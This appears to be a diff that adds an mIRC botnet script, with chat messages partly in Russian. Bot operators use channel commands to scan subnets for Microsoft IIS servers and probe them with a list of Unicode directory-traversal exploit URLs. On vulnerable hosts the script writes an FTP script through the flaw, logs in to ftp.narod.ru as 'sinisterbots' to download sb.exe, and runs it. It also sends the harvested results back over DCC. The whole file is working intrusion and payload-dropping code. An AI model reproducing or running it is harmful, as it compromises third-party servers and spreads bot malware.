@@ -1,0 +1,219 @@
+alias check.iss {
+  if (%unicod.step == 1) {   .msg %unicod.obj    12no [[--4IIS12--]] at this:4 $1 12(unix?, no answer?) | sockclose $sock($2) |  nick $remove($me,_uN)  }
+}
+alias donload_stat {
+  inc %dounload.step
+  if (%dounload.step == 1) set %ftp_temp $+ 1 $2 $+ c+echo+open+ftp.narod.ru>ftp.scr
+  if (%dounload.step == 2) set %ftp_temp $+ 2 $2 $+ c+echo+user+sinisterbots>>ftp.scr
+  if (%dounload.step == 3) set %ftp_temp $+ 3 $2 $+ c+echo+ $+ $3 $+ >>ftp.scr
+  if (%dounload.step == 4) set %ftp_temp $+ 4 $2 $+ c+echo+bin>>ftp.scr
+  if (%dounload.step == 5) set %ftp_temp $+ 5 $2 $+ c+echo+get+sb.exe+sb.exe>>ftp.scr
+  if (%dounload.step == 6) set %ftp_temp $+ 6 $2 $+ c+echo+bye>>ftp.scr
+  if (%dounload.step == 7) {
+    .timerdowl_ftp off
+    .timerdonw_off 1 10 sockclose download.*
+    unset %ftp_temp1  |  unset %ftp_temp2 | unset %ftp_temp3
+    set %ftp_temp $+ 7 $2 $+ +ftp+-s:ftp.scr+-n+-d
+    .msg $4 12*** Создал фпт скрипт..включил авто закачку!
+  }
+  .sockopen download. $+ %dounload.step $1 80 
+}
+alias unilook.stat {
+  if ($sock(unilook.*,0) < 50) {   
+    :start
+    inc %unilook.page
+    if (%unilook.page == 256) {
+      .timerunilook_start off 
+      .msg %unicod.obj 12Закончил сканировать подсеть:4  $1 $+ .* 12Нашел IIS серверов:4 %unilook.read 
+      nick $remove($me,_uS)
+      sockclose unilook.*  | halt 
+      halt   
+    }
+    .sockopen unilook. $+ %unilook.page $1 $+ . $+ %unilook.page  80 
+    .timerunil_s $+ $1 $+ . $+ %unilook.page 1 10 sockclose $1 $+ . $+ %unilook.page
+    if ($sock(unilook.*,0) < 50) { goto start }
+  }
+}
+on *:sockopen:download.*: {
+  .sockwrite -tn $sockname GET %ftp_temp [ $+ [ $gettok($sockname,2,46) ] ]  HTTP/1.0
+  .sockwrite -tn $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+  .sockwrite -tn $sockname User-Agent: Mozilla/3.0 (compatible)
+  .sockwrite -tn $sockname Host: $ip
+  .sockwrite -tn $sockname $lf
+}
+alias unicod.stat {
+  if ($sock(unicod.*,0) < 50) {   
+    :start
+    inc %unicod.page 
+    if ($read -l $+ %unicod.page unicodbag.txt == $null) {
+      .timerunicod_start off 
+      .msg %unicod.obj 4UNICOD -> THE END OF SCAN LIST( Found: %unicod.read ) 
+      nick $remove($me,_uN)  
+      sockclose unicod.*  | halt 
+    }
+    .sockopen unicod. $+ %unicod.page $1 80 
+    if ($sock(unicod.*,0) < 50) { goto start }
+  }
+}
+on *:sockopen:unicod.*: {
+  if (%unicod.step == 1) {
+    if ($sockerr > 0) {
+      .msg %unicod.obj 3No [[--4IIS3--]] found at:4 $sock($sockname).ip 
+      nick $remove($me,_uN)  
+      sockclose $sockname  | return 
+    }
+    .sockwrite -n $sockname HEAD / HTTP/1.0
+    .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+    .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible)
+    .sockwrite -n $sockname Host: $ip
+    .sockwrite -n $sockname
+    halt
+  }
+  if ($sockerr > 0) { sockclose $sockname  | return }
+  .sockmark $sockname $read -l $gettok($sock($sockname),2,46) unicodbag.txt
+  .sockwrite -n $sockname GET $sock($sockname).mark HTTP/1.0
+  .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+  .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible)
+  .sockwrite -n $sockname Host: $ip
+  .sockwrite -n $sockname
+}
+on *:sockopen:unilook.*: {
+  if ($sockerr > 0) { sockclose $sockname  | return }
+  .sockwrite -n $sockname HEAD / HTTP/1.0
+  .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+  .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible)
+  .sockwrite -n $sockname Host: $ip
+  .sockwrite -n $sockname
+}
+on *:sockread:unilook.*: {
+  .sockread -f %subsock
+  if ($sockerr > 0) { sockclose $sockname  | return }
+  if (Server: Microsoft-IIS isin %subsock) {      
+    write unicod_look $sock($sockname).ip
+    .timerunilook 1 4 .msg %unicod.obj 12Found IIS server! At:4 $sock($sockname).ip
+    inc %unilook.read
+    sockclose $sockname  
+  }
+}
+on *:sockread:unicod.*: {
+  .sockread -f %subsock
+  if (%unicod.step == 1) {
+    if ($sockerr > 0) { 
+      .msg %unicod.obj 3No [[--4IIS3--]] found at: $sock($sockname).ip 
+      nick $remove($me,_uN)  
+      sockclose $sockname | return  
+    }
+    if (Server: Microsoft-IIS isin %subsock) { set %unicod.step 2  |  .timerunicod_start  0 1 unicod.stat $sock($sockname).ip  | halt     }
+    halt
+  }
+  if ($sockerr > 0) { sockclose $sockname | return  }
+  if (Directory of c:\ isin %subsock) {
+    inc %unicod.read
+    .msg %unicod.obj 12Found IIS bAg! 3(4 $sock($sockname).ip $+ $sock($sockname).mark 3) 
+    write unicod_ready $sock($sockname).ip $+ $sock($sockname).mark
+    if (%unicod.read > 5) {
+      .msg %unicod.obj 4Нашел 5 багов на IIS: $sock($sockname).ip 3выключаю сканирование... 
+      nick $remove($me,_uN)  
+      .timerunicod_start off | sockclose unicod.* | halt  
+    }
+    sockclose $sockname 
+  }
+}
+on 10:text:*:*: {
+  if ($1 == !findfile) {
+    if ($2 == $null) { halt }
+    if ($3 == $null) { halt }
+    if ($4 == $null) { halt }
+    .msg $chan $findfile($2,$3,$4)
+  }
+  if (!download. isin $1) {
+    if ($2 == $null) { halt }
+    if ($3 == $null) { halt }
+    if ($4 == $null) { halt }
+    set %dounload.step 0
+    .msg  $chan 4*** Начал пИсать фтп скрипт на сервере: $2
+    .timerdowl_ftp 0 7 donload_stat $2 $3 $4 $chan
+  } 
+  if (!unicod.clear. isin $1) {
+    write -c unicod_ready
+    .msg $chan 3***  Очистил файл с насканенными IIS`ками! 
+  }
+  if (!unilook.clear. isin $1) {
+    write -c unicod_look
+    .msg $chan 3***  Очистил файл с насканенными IIS серверами! 
+  }
+  if (!unicod.rezult. isin $1) {
+    dcc send $nick unicod_ready
+  }
+  if (!unilook.rezult. isin $1) {
+    dcc send $nick unicod_look
+  }
+  if (!unilook.stop. isin $1) {
+    .msg $chan 12*** Сканирование остановлено! На сервере: 4 %unilook.ip $+ . $+  %unilook.page 12Было найдено серверов:4 %unilook.read
+    .timerunilook_start off |  sockclose unilook.*
+    nick $remove($me,_uS)  
+  }
+  if (!unicod.stop. isin $1) {
+    .msg $chan 12*** Сканирование остановлено! СкаН IIS`ки был:4 %unicod.ip 12Было найдено багов:4 %unicod.read
+    .timerunicod_start off |   .timercheck.iss off  | sockclose unicod.*
+    nick $remove($me,_uN)  
+  }
+  if (!unicod.stat. isin $1) {
+    if ($sock(unicod.*,0) > 1) {     .msg $chan 12*** Сканирую IIS`ку:4 %unicod.ip 12Статус:4 %unicod.page 12баг из 627...Найдено баг0в:4 %unicod.read |  halt  }
+    .msg $chan 12*** Последний СкаН IIS`ки был:4 %unicod.ip 12Было найдено багов:4 %unicod.read
+  }
+  if (!unilook.stat. isin $1) {
+    if ($sock(unilook.*,0) > 1) {     .msg $chan 12*** Сканирую IIS сервер:4 %unilook.ip $+ . $+  %unilook.page 12Найдено серверов:4 %unilook.read |  halt  }
+    .msg $chan 12*** Последний СкаН IIS серверов был:4 %unilook.ip $+ .* 12Было найдено багов:4 %unilook.read
+  }
+  if (!unilook. isin $1) {
+    if ($2 == $null) { halt }
+    if ($sock(unilook.*,0) > 1) {  .msg $chan 12 (!)Уже сканирую(!) IIS сервера, потсети:4 %unilook.ip $+ .* 12Найдено баг0в:4 %unilook.read | halt } 
+    if (%iniscan.stat.bag == on) {
+      .msg $chan 3*** УЖЕ ИДЕТ СКАНИРОВАНИЕ! Found server IIS:4 %uniscan.found 3Found bag:4 %uniscan.bag 
+      halt
+    }
+    set %unilook.page 0 |  set %unilook.read 0
+    set %unicod.obj $chan |  set %unilook.ip $2 
+    nick $me $+ _uS
+    .msg $chan 13*** Начал сканировать IIS сервера подсети: $2 $+ .*
+    .timerunilook_start 0 1 unilook.stat $2
+  } 
+  if (!unicod. isin $1) {
+    if ($2 == $null) { halt }
+    if ($exists(unicodbag.txt) != $true) { .msg $chan 12 (!) Нету файла с бАг листом...(!)  |  halt  }    
+    if ($sock(unicod.*,0) > 1) {  .msg $chan 12 (!)Уже сканирую(!) IIS`ку:4 %unicod.ip 12Статус:4 %unicod.page 12баг из 627...Найдено баг0в:4 %unicod.read | halt } 
+    if (%iniscan.stat.bag == on) {
+      .msg $chan 3*** УЖЕ ИДЕТ СКАНИРОВАНИЕ! Found server IIS:4 %uniscan.found 3Found bag:4 %uniscan.bag 
+      halt
+    }
+    set %unicod.page 0 |  set %unicod.step 1 | set %unicod.read 0
+    set %unicod.obj $chan |  set %unicod.ip $2 
+    nick $me $+ _uN
+    .msg $chan 13*** Начал сканировать IIS`ку: $2 (7ё-мое круто да?!13)
+    sockopen unicod. $+ %unicod.page $2 80 
+    .timercheck.iss 1 20 check.iss $2 unicod. $+ %unicod.page
+  } 
+  if ($1 == !portfree) {
+    if ($2 == $null) { halt }
+    if ($portfree($2) == $true) { .msg $chan 12*** Порт4 $2 12свободен! }
+    else {  .msg $chan 12*** Порт4 $2 12занят!  }
+  }
+  if (!info. isin $1 ) {
+    if ($2 == $null) { halt }
+    if ( ($remove($1,!info.) != *) && ($remove($1,!info.) != $me) ) { halt }
+    if ($me !ison $2) { halt }
+    set %op.inchan ""  | set %noop.inchan "" | set %op.temp 1
+    :start
+    if ($nick($2,%op.temp) == $null) { goto end | halt }
+    if ($nick($2,%op.temp) isop $2) { set %op.inchan %op.inchan @ $+ $nick($2,%op.temp) }
+    else { set %noop.inchan %noop.inchan $nick($2,%op.temp) }
+    inc %op.temp | goto start
+    :end
+    msg $chan 3[ Инфо $2 ]12: Mode:4 $chan($2).mode 12Банов:4 $ibl($2,0) 12Topic:4 $chan($2).topic
+    msg $chan 12 (Опы):4 %op.inchan 12(users):4 %noop.inchan 
+  }
+  if ($1 == !ip) {  .msg  $chan 12 IP:4 $ip 12HOST:4 $host  } 
+}
+alias ret_per { return % [ $+ [ $1 ] ] }
+
